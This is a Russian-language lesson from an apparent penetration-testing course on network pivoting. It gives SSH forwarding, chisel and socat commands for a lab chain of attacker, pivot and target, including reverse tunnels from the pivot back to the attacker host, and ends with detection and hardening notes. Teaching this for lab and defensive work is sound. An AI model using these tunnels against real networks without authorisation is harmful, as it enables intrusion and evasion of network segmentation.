# 14.1 — SSH-туннели и chisel

> **M14 · Этап 2 · 5 ч · 🟡 · артефакт:** `labs/m14-pivoting-infra/l01-tunnels/`

## Цель

Научиться проходить из сегмента в сегмент: local/remote/dynamic forwarding, chisel, socat — и понимать, когда какой инструмент уместен.

## Результат

- 3 рабочих туннеля.
- Схема «кто куда ходит».
- Список артефактов на каждом хосте.

## Теория

### 1. SSH forwarding

| Тип | Команда | Что делает |
|---|---|---|
| Local | `ssh -L 8080:10.10.20.10:80 user@pivot` | локальный порт → цель через pivot |
| Remote | `ssh -R 9000:localhost:9000 user@attacker` | порт на атакующем → локальный сервис pivot |
| Dynamic | `ssh -D 1080 user@pivot` | SOCKS5-прокси |

Ключи: `-N` (без shell), `-f` (фон), `-C` (сжатие), `-J` (jump host).

### 2. Chisel

HTTP-туннель, удобен, когда SSH недоступен. Server на атакующем, client на pivot.

```bash
# server
chisel server -p 8000 --reverse
# client (на pivot)
chisel client 10.10.10.50:8000 R:socks
```

Ожидаемо: SOCKS5 на `127.0.0.1:1080` у атакующего.

### 3. Socat

Точечный проброс:

```bash
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.10:80
```

### 4. Выбор инструмента

- SSH есть и разрешён — используйте SSH.
- Только HTTP — chisel.
- Нужен один порт — socat.
- Нужен полноценный L3 — ligolo-ng (см. 14.2).

### 5. Артефакты

- Процессы `ssh`, `chisel`, `socat`.
- Сетевые соединения на нестандартные порты.
- Файлы бинарников в `/tmp`, `%TEMP%`.
- Логи SSH (4624 type 3/10, `/var/log/auth.log`).

## Лаборатория

> `ATTACK` (10.10.10.50) → `PIVOT` (10.10.10.20, вторая сеть 10.10.20.0/24) → `TARGET` (10.10.20.10).

### 1. Local forward

```bash
ssh -N -L 8080:10.10.20.10:80 user@10.10.10.20
curl http://127.0.0.1:8080
```

Ожидаемо: страница `TARGET` через `PIVOT`.

### 2. Dynamic

```bash
ssh -N -D 1080 user@10.10.10.20
curl --socks5 127.0.0.1:1080 http://10.10.20.10
```

Ожидаемо: доступ к цели через SOCKS.

### 3. Remote

```bash
# на PIVOT
ssh -N -R 9000:localhost:22 user@10.10.10.50
# на ATTACK
ssh -p 9000 user@127.0.0.1
```

Ожидаемо: вход на `PIVOT` через обратный туннель.

### 4. Chisel

```bash
# ATTACK
chisel server -p 8000 --reverse --socks5
# PIVOT
./chisel client 10.10.10.50:8000 R:socks
# ATTACK
curl --socks5 127.0.0.1:1080 http://10.10.20.10
```

### 5. Socat

```bash
# PIVOT
socat TCP-LISTEN:8081,fork,reuseaddr TCP:10.10.20.10:80
# ATTACK
curl http://10.10.10.20:8081
```

### 6. Артефакты

```bash
# на PIVOT
ss -tpn | grep -E 'ssh|chisel|socat'
ps aux | grep -E 'ssh|chisel|socat'
```

Ожидаемо: процессы и соединения. Запишите.

## Атака и защита

- **Атака:** туннель под видом легитимного трафика.
- **Детект:** нестандартные порты, процессы, SSH-сессии, DNS/HTTP-аномалии.
- **Фикс:** egress-фильтрация, запрет SSH наружу, мониторинг процессов, сегментация.

## Самопроверка

- [ ] Чем `-L` отличается от `-R`?
- [ ] Когда chisel лучше SSH?
- [ ] Что видит защитник на pivot?
- [ ] Почему `socat` — точечное решение?
- [ ] Как обнаружить SSH-туннель?

## Дальше

[14.2 — SOCKS и двойной pivot](l02-socks-pivot.md)
